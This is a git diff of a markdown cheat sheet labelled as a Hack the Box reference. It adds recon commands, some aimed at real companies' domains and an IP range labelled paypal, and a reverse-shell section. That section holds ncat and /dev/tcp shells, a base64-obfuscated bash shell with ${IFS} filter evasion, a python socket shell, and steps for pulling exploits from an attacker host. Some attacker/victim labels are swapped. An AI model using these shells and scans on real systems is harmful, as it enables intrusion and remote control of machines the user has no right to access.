@@ -1,28 +1,60 @@
 ## Hack the Box Reference.<br>
 **Contains commands,Link and tricks for challenges**<br>
-*gzip*<br>
-gzip -d file.gz<br>
-*list all file in a directory with permission*<br>
+***COMMON COMMANDS***<br>
+***Nmap ***<br>
+•	nmap -sV -p 1-20000  -iL input.txt -oN output.txt<br>
+
+***Subfinder(only subfinder can run large wordlist)***<br>
+•	./subfinder -d freelancer.com -o output.txt<br>
+***Eyewitness***<br>
+•	./EyeWitness.py --headless -f hunchly_dark.txt -d output_dir1 --prepend-https <br>
+•	./EyeWitness.py --web --thread 50 -f hunchly_dark.txt -d output_dir1 --prepend-https<br>
+•	dnscan.py -d ubnt.com -w /SecLists/Discovery/DNS/bitquark_subdomains_top100K.txt -t 30 -o D_ubnt.txt<br>
+•	masscan -p80,443,8080,9090,8081, 66.211.168.0/22 > mass_paypal.txt<br>
+•	gobuster -m dns -u target.com -w $wordlist<br>
+***installing tab completion***<br>
+•	apt-get install bash-completion<br>
+***Untar***<br>
+•	tar -xvf sqlmap.tar.gz<br>
+•	gzip -d file.gz<br>
+•	tcpdump port 9009<br>
+•	tcpdump -nni eth0 icmp<br>
+•	ps -eaf | grep [w]get<br>
+•	cat /proc/meminfo<br>
+•	cat /proc/cpuinfo<br>
+•	wfuzz.py -c -z file,commons.txt --hc 404 -o html http://www.site.com/FUZZ 2> /var/www/html/res.html<br>
+•	./parameth.py -u TARGET<br>
+•	python linkfinder.py -i https://example.com/1.js -o results.html<br>
+
+***list all file in a directory with permission***<br>
 ls -l /home<br>
 In the above it is listing all files of home directory with permissions<br>
-*list all files with hidden*<br>
-ls -a<br>
-*show permission of directory or file*<br>
+***list all files with hidden with permission***<br>
+ls -al<br>
+***show permission of directory or file***<br>
 ls -ld<br>
-*REVERSE SHELL*<br>
+***REVERSE SHELL***<br>
+
 Victim: ncat -e /bin/bash {IP} {PORT}<br>
 Attacker: Machine:nc -lvnp {PORT}<br>
 python -m SimpleHTTPServer 9999Victim: bash -i >& /dev/tcp/{IP}/{PORT} 0>&1<br>
+
 Attacker: Machine:nc -lvnp {PORT}<br>
 Victim(Base64): echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85MDA3IDA+JjE|base64${IFS}-d|bash${IFS}-;<br>
-Attacker: Machine:nc -lvnp {PORT}<br>
 
-*File transfer during REVERSE SHELL*<br>
+Attacker:nc 192.168.1.102 4444 -e /bin/sh <br>
+Victim:nc -lvp 4444 <br>
+Attacker:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br>
+Victim:nc -lvp 1234<br>
+
+***File transfer during REVERSE SHELL***<br>
 Attacker: service apache2 start<br>
 place shell or exploit in /var/www/html<br>
+
 Attacker:python -m SimpleHTTPServer 9999<br>
 Victim: wget 192.168.1.102:9999/file.txt<br>
 Victim: curl -O http://192.168.0.101/file.txt<br>
+
 Attacker:nc -lvp 4444 < /root/home/exploit.txt<br>
 Victim:nc 192.168.1.102 4444 > exploit.txt<br>
 
